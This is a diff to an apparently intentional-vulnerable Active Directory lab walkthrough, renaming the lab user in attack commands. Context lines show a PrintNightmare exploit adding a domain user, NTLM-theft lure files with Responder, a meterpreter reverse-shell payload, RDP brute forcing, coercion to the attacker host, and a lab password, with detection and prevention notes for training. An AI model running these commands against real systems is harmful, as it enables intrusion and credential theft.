@@ -283,7 +283,7 @@ SQL> EXEC ('xp_cmdshell ''whoami''') AT [LINKED.SERVER]
 ```bash
 curl -i http://ca01.corp.local/certsrv/
 curl -i http://ca01.corp.local/certsrv/certfnsh.asp
-certipy find -u alice -p '<later>' -dc-ip 10.10.0.10 -vulnerable    # post-auth
+certipy find -u peter.parker -p '<later>' -dc-ip 10.10.0.10 -vulnerable    # post-auth
 ```
 **Detection:** IIS access logs to `/certsrv/`; baseline who hits it.
 **Prevention:** require HTTPS; disable NTLM on web enrollment; EPA; restrict via firewall.
@@ -341,7 +341,7 @@ python3 Coercer.py coerce -u '' -p '' -t 10.10.0.10 -l 10.10.0.1 --filter-method
 ```bash
 sudo smbserver.py -smb2support share /tmp/dll
 # craft addprinter.dll that runs 'net user evil P@ss /add /domain'
-python3 cve-2021-1675.py corp.local/alice:'DVADlab2024!'@10.10.0.10 '\\10.10.0.1\share\addprinter.dll'
+python3 cve-2021-1675.py corp.local/peter.parker:'DVADlab2024!'@10.10.0.10 '\\10.10.0.1\share\addprinter.dll'
 ```
 **Detection:** Event `316` PrintService driver-installed; Sysmon `7` DLL load by `spoolsv.exe`.
 **Prevention:** patch; disable Print Spooler on DCs and servers that don't print; `RestrictDriverInstallationToAdministrators=1`.
@@ -396,7 +396,7 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.0.1 LPORT=443 -f v
 git clone https://github.com/Greenwolf/ntlm_theft
 python3 ntlm_theft.py --generate all --server 10.10.0.1 --greedy
 cp generated/*.lnk /tmp/landing/
-smbclient //10.10.0.13/Public -U 'corp\alice%DVADlab2024!' -c 'put boring-report.lnk'
+smbclient //10.10.0.13/Public -U 'corp\peter.parker%DVADlab2024!' -c 'put boring-report.lnk'
 sudo responder -I virbr1 -wd
 ```
 **Detection:** Sysmon `11` for `.lnk`/`.url`/`.scf` create; SMB `5145` for share writes; egress UDP 137/445 to attacker IP.
@@ -679,7 +679,7 @@ Every host now also listens on `5986/tcp` with a self-signed cert. Practice the 
 ```bash
 nmap -p5985,5986 --script ssl-cert 10.10.0.10
 # Self-signed → relay/MITM angle (or just trust-on-first-use):
-evil-winrm -i 10.10.0.10 -u alice -p 'DVADlab2024!' -S
+evil-winrm -i 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -S
 ```
 **Detection:** Cert-pinning telemetry in EDR; unusual 5986 source IPs.
 **Prevention:** Issue WinRM certs from the enterprise CA; pin thumbprints on management hosts.
@@ -726,8 +726,8 @@ done
 
 ```bash
 nmap -p3389 --script rdp-vuln-ms12-020,rdp-ntlm-info 10.10.0.100
-crowbar -b rdp -s 10.10.0.100/32 -u alice -C passwords.txt
-xfreerdp /v:10.10.0.100 /u:alice /p:'DVADlab2024!' -sec-nla
+crowbar -b rdp -s 10.10.0.100/32 -u peter.parker -C passwords.txt
+xfreerdp /v:10.10.0.100 /u:peter.parker /p:'DVADlab2024!' -sec-nla
 ```
 **Detection:** 4625 logon type 10 on ws01; RDP brute volume.
 **Prevention:** `UserAuthentication=1` (require NLA); MFA via RDPGW.
@@ -742,7 +742,7 @@ Spooler is now started on every member, not just `dc01`. A shared printer `DVAD-
 # Spool enumeration (anon-bind via lsarpc usually fine):
 impacket-rpcdump '@10.10.0.13' | grep -i spoolss
 # Coerce from non-DC:
-impacket-printerbug 'corp.local/alice:DVADlab2024!@10.10.0.14' 10.10.0.1   # SQL01 coerces to your Kali
+impacket-printerbug 'corp.local/peter.parker:DVADlab2024!@10.10.0.14' 10.10.0.1   # SQL01 coerces to your Kali
 # Coerce DC$:
 impacket-printerbug -no-pass '@10.10.0.10' 10.10.0.1
 ```
@@ -770,7 +770,7 @@ impacket-petitpotam -u '' -p '' -d corp.local 10.10.0.1@80/test 10.10.0.10
 `ADWS` service auto-start is enforced on every DC. ADWS is the transport behind `Get-ADUser` etc. — useful when LDAP/389 is blocked but 9389 isn't.
 
 ```bash
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --use-kcache  # falls back to ADWS
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --use-kcache  # falls back to ADWS
 # Or directly via SOAPHound / PowerShell ActiveDirectory module:
 Get-ADUser -Server dc01.eu.corp.local:9389 -Filter *
 ```
@@ -897,7 +897,7 @@ You are on Kali at 10.10.0.1 with no creds.
 
 ## Why these vectors weren't in the previous walkthrough
 
-The original docs assumed you were `corp\alice` with a password — they started at recon-as-domain-user. That's a reasonable assumption for the lab's published flag matrix (REC/CRED/LAT/PE/PER/DF), but it skips the most realistic and most teachable part of a real engagement: *how you got the first foothold*. This page closes that gap. From here, the existing docs take over:
+The original docs assumed you were `corp\peter.parker` with a password — they started at recon-as-domain-user. That's a reasonable assumption for the lab's published flag matrix (REC/CRED/LAT/PE/PER/DF), but it skips the most realistic and most teachable part of a real engagement: *how you got the first foothold*. This page closes that gap. From here, the existing docs take over:
 
 - IA-006 / IA-007 → you have a password → [`02-recon.md`](02-recon.md)
 - IA-013 → you have DC$ cert / TGT → [`07-forest-compromise.md`](07-forest-compromise.md) (DF-011 ESC8 chain)
